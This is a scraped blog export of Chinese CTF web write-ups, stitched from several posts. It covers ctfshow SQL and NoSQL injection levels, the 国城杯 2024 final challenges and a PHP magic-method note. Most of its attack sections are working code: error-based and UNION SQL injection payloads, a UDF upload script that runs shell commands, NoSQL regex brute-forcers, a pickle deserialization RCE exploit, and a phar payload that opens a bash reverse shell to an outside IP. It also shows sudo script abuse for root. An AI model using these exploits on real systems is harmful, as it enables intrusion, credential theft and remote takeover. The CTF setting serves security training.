1)%23\r#ctfshow{89982b11-5c7d-4215-a78\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23\r#9-a9f8ecc8f1b1}\r# 数据长度有限制，可以使用substr来截取\r//ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1} web245 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue报错注入\npayload\n查数据库名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select database()))))%23\r爆表名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23\r//ctfshow_flagsa\r爆字段名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;ctfshow_flagsa\u0026#34;))))%23\r//flag1\r爆数据：\rid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23\rid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23\r//ctfshow{41446106-c47e-434d-a0c0-16ee43375249} web246 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor报错注入\n原理：SQL注入报错注入之floor()报错注入原理分析_sql注入floor-CSDN博客\n#获取表名\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#获取列名\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flags\u0026#39; limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#获取数据\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23 web247 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor 这道题floor函数也被ban掉了\n根据floor报错注入的原理，其实我们可以知道，之所以会出现错误主要是因为用floor对rand(0)*2进行取整，目的输出011011\u0026hellip;的结果，而既然这样我们只需要找一个同样能进行取整的函数来代替floor就ok了\n除了floor之外，我们还能使用round，ceil等\npayload\n查表 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\r查列 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagsa\u0026#39; limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\r查数据 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23 web248 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤, UDF注入\nctfshow-web入门-sql注入-web248-UDF 注入_ctfshow web248-CSDN博客\n我们需要将 UDF 的动态链接库文件（xxx.dll文件）放到 MySQL 的检索目录下才能创建自定义函数，对于不同版本的 mysql，检索目录是不同的：\nMySQL \u0026lt; 5.0\t导出路径随意； 5.0 \u0026lt;= MySQL\u0026lt; 5.1\t需要导出至目标服务器的系统目录（如：c:/windows/system32/） 5.1 \u0026lt; MySQL\t必须导出到MySQL安装目录下的lib\\plugin文件夹下\n堆叠注入查版本\n/api/?id=0\u0026#39;;select version();%23 大于5.1，接着要查目录路径\n/api/?id=0\u0026#39;;select @@plugin_dir;%23 /usr/lib/mariadb/plugin 拿到路径，我们接下来就可以传入我们的恶意so文件了\nsqlmap中有已经写好的 udf 文件\n如，lib_mysqludf_sys_64.so\n但是由于get传参有长度限制，我们需要进行分段传参\n放一个国外大佬的脚本，将udf文件分段上传后再进行合并即可\nimport requests\rurl=\u0026#34;http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/\u0026#34;\rudf=\u0026#34;\u0026#34;\rudfs=[]\rfor i in range(0,len(udf),5000):\rudfs.append(udf[i:i+5000])\r#写入多个文件中\rfor i in udfs:\rurl1=url+f\u0026#34;?id=1\u0026#39;;SELECT \u0026#39;{i}\u0026#39; into dumpfile \u0026#39;/tmp/\u0026#34;+str(udfs.index(i))+\u0026#34;.txt\u0026#39;%23\u0026#34;\rrequests.get(url1)\r#合并文件生成so文件\rurl2=url+\u0026#34;?id=1\u0026#39;;SELECT unhex(concat(load_file(\u0026#39;/tmp/0.txt\u0026#39;),load_file(\u0026#39;/tmp/1.txt\u0026#39;),load_file(\u0026#39;/tmp/2.txt\u0026#39;),load_file(\u0026#39;/tmp/3.txt\u0026#39;))) into dumpfile \u0026#39;/usr/lib/mariadb/plugin/hack.so\u0026#39;%23\u0026#34;\rrequests.get(url2)\r#创建自定义函数并执行恶意命令\rrequests.get(url+\u0026#34;?id=1\u0026#39;;create function sys_eval returns string soname \u0026#39;hack.so\u0026#39;%23\u0026#34;)\rr=requests.get(url+\u0026#34;?id=1\u0026#39;;select sys_eval(\u0026#39;cat /f*\u0026#39;)%23\u0026#34;)\rprint(r.text) web249 1sql语句 2 3 //无 4 $user = $memcache-\u0026gt;get($id); 5 6返回逻辑 7 8 //无过滤 payload:\n?id[]=flag web250 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } ctfshow-web入门-sql注入（web249-web253）nosql 注入_ctfshow web250-CSDN博客\n在这些操作符中，$ne 就是我们在重言式注入中需要利用到的那个，它的作用是将不等于指定值的数据都查询出来，比如 $ne=1 时就是将所有不等于 1 的数据都查询出来。\n所以payload就是\nusername[$ne]=1\u0026amp;password[$ne]=1 环境好像有点问题（？）前两次一直查不出来\nweb251 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 同样是\nusername[$ne]=1\u0026amp;password[$ne]=1 继续用上一题的 payload，返回 admin 的密码，但是这次的密码里没有 flag\n可能flag在其他用户的密码里，我们禁用admin\nusername[$ne]=admin\u0026amp;password[$ne]=1 拿到flag\nweb252 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 13 这题有很多不同的username\n我们可以考虑采用正则匹配来筛选\nusername[$ne]=1\u0026amp;password[$regex]=ctfshow{ or\n用$gt （大于）一直尝试知道拿到有flag的用户\nusername[$ne]=admin\u0026amp;password[$ne]=1\rusername[$gt]=admin1\u0026amp;password[$ne]=1\rusername[$gt]=admin2\u0026amp;password[$ne]=1\rusername[$gt]=admin3\u0026amp;password[$ne]=1 or\n正则匹配去掉所有为admin开头的用户\nusername[$regex]=^[^admin].*$\u0026amp;password[$ne]=1 web253 1sql语句 2 3 //sql 4 db.ctfshow_user.find({username:\u0026#39;$username\u0026#39;,password:\u0026#39;$password\u0026#39;}).pretty() 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 方法一 CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园\n猜测到id为flag，直接布尔盲注拿到flag\nimport string\rimport requests\rurl = \u0026#34;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/\u0026#34;\rletters = \u0026#34;{}-_\u0026#34; + string.ascii_lowercase + string.digits\rdef valid_pass(password: str) -\u0026gt; bool:\rdata = {\r\u0026#34;username[$regex]\u0026#34;: \u0026#34;flag\u0026#34;,\r\u0026#34;password[$regex]\u0026#34;: f\u0026#34;{password}.*\u0026#34;\r}\rresponse = requests.post(url, data=data)\rreturn \u0026#34;登陆成功\u0026#34; in response.json()[\u0026#34;msg\u0026#34;]\rresult = \u0026#34;\u0026#34;\rwhile True:\rfor letter in letters:\rif valid_pass(result + letter):\rresult += letter\rprint(f\u0026#34;[*] result: {result}\u0026#34;)\rbreak 方法二 import requests, time, json\rdef brute(action, username=\u0026#34;\u0026#34;):\rurl = \u0026#34;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/\u0026#34;\rif action == \u0026#34;username\u0026#34;:\rres = \u0026#34;^[^a]\u0026#34; # admin1的password为ctfshow666...很明显不是flag，所以禁掉admin开头的用户\relse:\rres = \u0026#34;^ctfshow{\u0026#34;\rfor j in range(30):\rflag = False\rfor i in range(127):\rreg = res\rif chr(i) not in \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz-{}:,_\u0026#34;:\rcontinue\rn = chr(i)\rif chr(i) in \u0026#34;-{}:\u0026#34;:\rn = \u0026#34;\\\\\u0026#34;+chr(i)\rprint(chr(i))\rif action == \u0026#34;username\u0026#34;:\rdata = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;, \u0026#34;password[$ne]\u0026#34;: f\u0026#34;1\u0026#34;}\relse:\rdata = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{username}$\u0026#34;, \u0026#34;password[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;}\rwhile True:\rtry:\rr = requests.post(url, data=data, timeout=7)\rbreak\rexcept TimeoutError:\rtime.sleep(0.1)\rexcept KeyboardInterrupt:\rexit(0)\rtry:\rresp = json.loads(r.text)\rexcept:\rresp = None\rcontinue\rif resp[\u0026#34;msg\u0026#34;] == \u0026#34;\\u767b\\u9646\\u6210\\u529f\u0026#34;:\rres += chr(i)\rflag = True\rbreak\rif not flag:\rbreak\rprint(res)\rreturn res\rif __name__ == \u0026#39;__main__\u0026#39;:\rusername = brute(\u0026#34;username\u0026#34;)\rprint(f\u0026#34;用户名为: {username}\u0026#34;)\rpassword = brute(\u0026#34;password\u0026#34;, username)\rprint(f\u0026#34;用户名: {username}\\n密码: {password}\u0026#34;) ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/","summary":"\u003ch4 id=\"无过滤注入对输出内容进行过滤\"\u003e\u003cstrong\u003e无过滤注入\u003c/strong\u003e（对输出内容进行过滤）\u003c/h4\u003e\n\u003ch4 id=\"web171\"\u003eweb171\u003c/h4\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e$sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eflag是存在于username为flag的用户的数据中，我们只需要通过\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1\u0026#39; or 1=1 --+\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即可输出所有用户数据\u003c/p\u003e\n\u003ch4 id=\"web172\"\u003eweb172\u003c/h4\u003e\n\u003cp\u003e相比上一题，这题增加了过滤\u003c/p\u003e","title":"CTFSHOW-SQL注入-Writeup"},{"content":"CTF mountain Python Bottle框架伪造session打pickle反序列化\n拿到题目看一下源码，有hint\n访问/display\n根据提示，尝试用photo参数读图片\n猜测应该有任意文件读取\n读一下/etc/passwd\n接下来看看能不能读源码\n先读环境变量/proc/self/cmdline，发现被waf了\n再试试直接读/proc/1/cmdline（self被waf了）\n得到源码位置，我们直接读\n/apppppp/app.py\n拿到源码\n1from bottle import Bottle, route, run, template, request, response 2from config.D0g3_GC import Mountain 3import os 4import re 5 6 7messages = [] 8 9@route(\u0026#34;/\u0026#34;) 10def home(): 11 return template(\u0026#34;index\u0026#34;) 12 13 14@route(\u0026#34;/hello\u0026#34;) 15def hello_world(): 16 try: 17 session = request.get_cookie(\u0026#34;name\u0026#34;, secret=Mountain) 18 if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: 19 session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} 20 response.set_cookie(\u0026#34;name\u0026#34;, session, secret=Mountain) 21 return template(\u0026#34;guest\u0026#34;, name=session[\u0026#34;name\u0026#34;]) 22 if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: 23 return template(\u0026#34;admin\u0026#34;, name=session[\u0026#34;name\u0026#34;]) 24 except: 25 return \u0026#34;hacker!!! I\u0026#39;ve caught you\u0026#34; 26 27 28@route(\u0026#34;/display\u0026#34;) 29def get_image(): 30 photo = request.query.get(\u0026#39;photo\u0026#39;) 31 if photo is None: 32 return template(\u0026#39;display\u0026#39;) 33 if re.search(\u0026#34;^../|environ|self\u0026#34;, photo): 34 return \u0026#34;Hacker!!! I\u0026#39;ll catch you no matter what you do!!!\u0026#34; 35 requested_path = os.path.join(os.getcwd(), \u0026#34;picture\u0026#34;, photo) 36 try: 37 if photo.endswith(\u0026#39;.png\u0026#39;): 38 default_png_path = \u0026#34;/appppp/picture/\u0026#34; 39 pngrequested_path = default_png_path+photo 40 with open(pngrequested_path, \u0026#39;rb\u0026#39;) as f: 41 tfile = f.read() 42 response.content_type = \u0026#39;image/png\u0026#39; 43 else: 44 with open(requested_path) as f: 45 tfile = f.read() 46 except Exception as e: 47 return \u0026#34;you have some errors, continue to try again\u0026#34; 48 return tfile 49 50 51@route(\u0026#34;/admin\u0026#34;) 52def admin(): 53 session = request.get_cookie(\u0026#34;name\u0026#34;, secret=Mountain) 54 if session and session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: 55 return template(\u0026#34;administator\u0026#34;, messages=messages) 56 else: 57 return \u0026#34;No permission!!!!\u0026#34; 58 59 60 61 62if __name__ == \u0026#34;__main__\u0026#34;: 63 os.chdir(os.path.dirname(__file__)) 64 run(host=\u0026#34;0.0.0.0\u0026#34;, port=8089) 这里是导入的是构造cookie的key\nfrom config.D0g3_GC import Mountain key可以通过任意文件读取读到\n/appppp/config/D0g3_GC.py\n通过代码我们可以发现，哪怕我们构造出admin进入到/admin路由那我们其实也不能得到什么\n事实上这是一道pickle反序列化的题目\n我们如果跟进get_cookie方法(/admin和/hello都有)我们可以发现\n在这个get_cookie方法里面会对cookie中的数据进行pickle反序列化\n也就是说我们可以通过他就可以进行任何命令的执行\nexp\n1from bottle import route, run,response 2import os 3 4 5Mountain = \u0026#34;123\u0026#34; 6 7class exp(object): 8 def __reduce__(self): 9 return (eval, (\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;calc\u0026#39;).read()\u0026#34;,)) 10 11 12@route(\u0026#34;/\u0026#34;) 13def index(): 14 session = exp() 15 response.set_cookie(\u0026#34;name\u0026#34;, session, secret=Mountain) 16 return \u0026#34;success\u0026#34; 17 18 19if __name__ == \u0026#34;__main__\u0026#34;: 20 os.chdir(os.path.dirname(__file__)) 21 run(host=\u0026#34;127.0.0.1\u0026#34;, port=8081) 弹shell拿flag\n图片查看器 考点：1.信息收集 2.filterchain读文件 3.phar反序列化 4.提权\n拿到题目是一个名字输入器，但这玩意没什么用\n随便输一个名字就会进入到/trans1t.php\n我们先不急着去挑战，先看看这个页面有没有什么hint\n提示有东西在hI3t.php,但是我们没办法直接访问\n接着点来到挑战来到/chal13nge.php\n是一个图片上传，我们再查看一下源代码\n结合刚刚看到的hI3t.php，猜测大概率是要想办法读hI3t.php\n再看看这个文件上传，再上传成功后可以进行文件信息的查询，文件信息查询使用的方法很可能存在filter链的漏洞\n这里是关于oracle的文件读取漏洞\nPHP Filter链——基于oracle的文件读取攻击 - 先知社区\n自动化工具：https://github.com/synacktiv/php_filter_chains_oracle_exploit\npython filters_chain_oracle_exploit.py --target http://125.70.243.22:31345/chal13nge.php --file \u0026#39;/var/www/html/hI3t.php\u0026#39; --parameter image_path\r//--target 目标地址 --file 要读的文件地址 --parameter 要注入的参数 '\n访问/x@1.php\n我们可以看到一个后门类backdoor，通过它我们可以执行任意的命令\n那我们怎么调用这个后门类呢？\n结合刚刚的文件上传和文件信息查询，我们可以想到phar反序列化\n1\u0026lt;?php 2 3class backdoor 4{ 5 public $cmd; 6 7 function __destruct() 8 { 9 $cmd = $this-\u0026gt;cmd; 10 system($cmd); 11 } 12} 13 14$a=new backdoor(); 15$a-\u0026gt;cmd=\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/106.55.168.231/7777 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;; //弹个shell 16$phar = new Phar(\u0026#34;test.phar\u0026#34;); 17$phar-\u0026gt;startBuffering(); 18$phar-\u0026gt;setStub(\u0026#34;\u0026lt;php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); 19$phar-\u0026gt;setMetadata($a); 20$phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); 21$phar-\u0026gt;stopBuffering(); 接着我们可通过抓包修改文件后缀的方法上传我们的phar文件\n上传成功\n我们接着读phar文件\n成功弹shell\n尝试读flag发现要提权\n通过 sudo -l 可以发现有一个check.sh文件具有sudo权限\n执行check.sh会运行run.sh\n也就是说我们可以通过写一个run.sh来读flag\necho \u0026#34;cat /root/flag\u0026#34; \u0026gt; /tmp/rootscripts/run.sh\rchmod 777 /tmp/rootscripts/run.sh\rsudo /tmp/rootscripts/check.sh \u0026#34;/tmp/rootscripts\u0026#34; 拿到flag\n题外\n/chal13nge.php的源码\n1\u0026lt;?php 2error_reporting(0); 3include \u0026#34;class.php\u0026#34;; 4 5if (isset($_POST[\u0026#39;image_path\u0026#39;])) { 6 $image_path = $_POST[\u0026#39;image_path\u0026#39;]; 7 echo \u0026#34;The owner ID of the file is: \u0026#34;; 8 echo fileowner($image_path).\u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; 9 echo \u0026#34;文件信息如下：\u0026#34;. \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 10 $m = getimagesize($image_path); 11 if ($m) { 12 echo \u0026#34;宽度: \u0026#34; . $m[0] . \u0026#34; 像素\u0026lt;br\u0026gt;\u0026#34;; 13 echo \u0026#34;高度: \u0026#34; . $m[1] . \u0026#34; 像素\u0026lt;br\u0026gt;\u0026#34;; 14 echo \u0026#34;类型: \u0026#34; . $m[2] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 15 echo \u0026#34;HTML 属性: \u0026#34; . $m[3] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 16 echo \u0026#34;MIME 类型: \u0026#34; . $m[\u0026#39;mime\u0026#39;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 17 } else { 18 echo \u0026#34;无法获取图像信息，请确保文件为有效的图像格式。\u0026#34;; 19 } 20} 21 22$allowed_extensions = [\u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;gif\u0026#39;, \u0026#39;png\u0026#39;]; 23$upload_dir = __DIR__ . \u0026#39;/uploads/\u0026#39;; 24if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_FILES[\u0026#39;image\u0026#39;])) { 25 $file = $_FILES[\u0026#39;image\u0026#39;]; 26 $file_ext = strtolower(pathinfo($file[\u0026#39;name\u0026#39;], PATHINFO_EXTENSION)); 27 28 if (in_array($file_ext, $allowed_extensions)) { 29 $upload_path = $upload_dir . basename($file[\u0026#39;name\u0026#39;]); 30 31 if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $upload_path)) { 32 echo \u0026#34;上传成功！路径: \u0026#34; . \u0026#39;uploads/\u0026#39; . basename($file[\u0026#39;name\u0026#39;]); 33 } else { 34 echo \u0026#34;文件上传失败，请重试。\u0026#34;; 35 } 36 } else { 37 echo \u0026#34;不支持的文件类型，仅支持: \u0026#34; . implode(\u0026#34;, \u0026#34;, $allowed_extensions); 38 } 39} 40?\u0026gt; 41\u0026lt;!DOCTYPE html\u0026gt; 42\u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; 43\u0026lt;head\u0026gt; 44 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 45 \u0026lt;title\u0026gt;图片上传与信息获取\u0026lt;/title\u0026gt; 46\u0026lt;/head\u0026gt; 47\u0026lt;body\u0026gt; 48\u0026lt;h2\u0026gt;图片上传\u0026lt;/h2\u0026gt; 49\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; 50 \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image\u0026#34; required\u0026gt; 51 \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;上传图片\u0026lt;/button\u0026gt; 52\u0026lt;/form\u0026gt; 53\u0026lt;h2\u0026gt;获取图片信息\u0026lt;/h2\u0026gt; 54\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; 55 \u0026lt;label for=\u0026#34;image_path\u0026#34;\u0026gt;请输入图片路径：\u0026lt;/label\u0026gt; 56 \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;image_path\u0026#34; required\u0026gt; 57 \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;获取图片信息\u0026lt;/button\u0026gt; 58\u0026lt;/form\u0026gt; 59\u0026lt;/body\u0026gt; 60\u0026lt;!--只需要从一个文件中获取到关键信息，这个文件在哪儿呢--\u0026gt; 从源码我们可以看到关于照片的信息查询使用的是getimagesize函数，而且没有对传入的参数进行过滤\n而getimagesize也是受filter链影响的函数之一\nAWDP Chemical_Plant 攻击 FeedbackService.php\n1\u0026lt;?php 2error_reporting(0); 3class FeedbackService { 4 private $db; 5 6 public function __construct($dbConnection) { 7 $this-\u0026gt;db = $dbConnection; 8 } 9 10 public function addFeedbackByUserId($user_id, $feedback) { 11 // 预处理 12 $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO feedback (userid, feedback) VALUES (?, ?)\u0026#34;); 13 $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $user_id, $feedback); 14 15 // 执行插入操作 16 if ($stmt-\u0026gt;execute()) { 17 return true; 18 } else { 19 return false; 20 } 21 } 22 23 public function getEmailById($id) { 24 // 预处理 25 $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT userid FROM feedback WHERE id = ?\u0026#34;); 26 $stmt-\u0026gt;bind_param(\u0026#34;i\u0026#34;, $id); 27 // 执行查找操作 28 if ($stmt-\u0026gt;execute()) { 29 $result = $stmt-\u0026gt;get_result(); 30 if ($result-\u0026gt;num_rows \u0026gt; 0) { 31 $row = $result-\u0026gt;fetch_assoc(); 32 $arr = stripslashes($row[\u0026#39;userid\u0026#39;]); 33 eval(\u0026#39;$arr=\u0026#39;.$arr.\u0026#39;;\u0026#39;); 34 return $arr; 35 } else { 36 return null; 37 } 38 } else { 39 return false; 40 } 41 } 42} 43 44?\u0026gt; 在FeedbackService.php的getEmailById方法中的存在eval，假如arr可控，那我们就可以进行任意命令执行\n那我们继续往上看\n$arr = stripslashes($row[\u0026#39;userid\u0026#39;]); 变量arr来源于数据库查表id返回的结果中的userid\n假如说我们可以提前在userid中写入我们要执行的命令，再通过id查询，就可以进行任意命令的执行\n写入数据库的命令我们可以在FeedbackService.php的addFeedbackByUserId方法中找到\npublic function addFeedbackByUserId($user_id, $feedback) {\r// 预处理\r$stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO feedback (userid, feedback) VALUES (?, ?)\u0026#34;);\r$stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $user_id, $feedback);\r// 执行插入操作\rif ($stmt-\u0026gt;execute()) {\rreturn true;\r} else {\rreturn false;\r}\r} 这里通过贫拼接的方式将user_id拼接到sql语句中并执行\n那我们接下就需要找到哪里调用addFeedbackByUserId方法\n在services.php里进行用户反馈内容提交时，没有进行任何过滤就调用addFeedbackByUserId方法写入\n那我们执行个whoami试试\n命令为什么要这样写呢\neval(\u0026#39;$arr=\u0026#39;.$arr.\u0026#39;;\u0026#39;); 因为命令执行的时候进行了简单的拼接\n写入数据后我们接下来就要看看怎样调用getEmailById方法进行数据库id查询\ncontroller.php\n1\u0026lt;?php 2 3// 引入类文件 4require_once \u0026#39;NewsService.php\u0026#39;; 5require_once \u0026#39;FeedbackService.php\u0026#39;; 6require_once\u0026#39;dbconnect.php\u0026#39;; 7require_once \u0026#39;news_data.php\u0026#39;; 8 9$db = new DBConnect(); 10$connection = $db-\u0026gt;getConnection(); 11$NewsService = new NewsService($news_items); 12$FeedbackService = new FeedbackService($connection); 13 14$className = isset($_GET[\u0026#39;c\u0026#39;]) ? $_GET[\u0026#39;c\u0026#39;] : null; 15$methodName = isset($_GET[\u0026#39;m\u0026#39;]) ? $_GET[\u0026#39;m\u0026#39;] : null; 16$id = isset($_GET[\u0026#39;id\u0026#39;]) ? $_GET[\u0026#39;id\u0026#39;] : null; 17 18 19if ($className \u0026amp;\u0026amp; $methodName) { 20 if ($className === \u0026#39;NewsService\u0026#39; \u0026amp;\u0026amp; method_exists($NewsService, $methodName)) 21 { 22 echo $NewsService-\u0026gt;$methodName($id); 23 } 24 elseif ($className === \u0026#39;FeedbackService\u0026#39; \u0026amp;\u0026amp; method_exists($FeedbackService, $methodName)) 25 { 26 echo $FeedbackService-\u0026gt;$methodName($id); 27 } else { 28 echo \u0026#34;无效的类或方法\u0026#34;; 29 } 30} else { 31 echo \u0026#34;缺少类或方法参数\u0026#34;; 32} 33 34 35?\u0026gt; 在controller.php里面可以通调用FeedbackService.php和NewsService.php中的方法\n$className = isset($_GET[\u0026#39;c\u0026#39;]) ? $_GET[\u0026#39;c\u0026#39;] : null;\r$methodName = isset($_GET[\u0026#39;m\u0026#39;]) ? $_GET[\u0026#39;m\u0026#39;] : null;\r$id = isset($_GET[\u0026#39;id\u0026#39;]) ? $_GET[\u0026#39;id\u0026#39;] : null; 通过get传参即可调用getEmailById方法\npayload:\nc=FeedbackService\u0026amp;m=getEmailById\u0026amp;id=0 这个id我们其实并不清楚，可以爆破或者一个个试试，反正不多\n命令成功执行，接下来只需要读flag就行了\n","permalink":"http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/","summary":"\u003ch3 id=\"ctf\"\u003eCTF\u003c/h3\u003e\n\u003ch4 id=\"mountain\"\u003emountain\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003ePython Bottle框架伪造session打pickle反序列化\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e拿到题目看一下源码，有hint\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241226140358450\" loading=\"lazy\" src=\"../assets/image-20241226140358450.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问/display\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241226140433229\" loading=\"lazy\" src=\"../assets/image-20241226140433229.png\"\u003e\u003c/p\u003e\n\u003cp\u003e根据提示，尝试用photo参数读图片\u003c/p\u003e","title":"国城杯决赛-Web-Writeup"},{"content":"PHP的魔法方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：\n1__construct()，类的构造函数 2 3__destruct()，类的析构函数 4 5__call()，在对象中调用一个不可访问方法时调用 6 7__callStatic()，用静态方式中调用一个不可访问方法时调用 8 9__get()，获得一个类的成员变量时调用 10 11__set()，设置一个类的成员变量时调用 12 13__isset()，当对不可访问属性调用isset()或empty()时调用 14 15__unset()，当对不可访问属性调用unset()时被调用。 16 17__sleep()，执行serialize()时，先会调用这个函数 18 19__wakeup()，执行unserialize()时，先会调用这个函数 20 21__toString()，类被当成字符串时的回应方法 22 23__invoke()，调用函数的方式调用一个对象时的回应方法 24 25__set_state()，调用var_export()导出类时，此静态方法会被调用。 26 27__clone()，当对象复制完成时调用 28 29__autoload()，尝试加载未定义的类 30 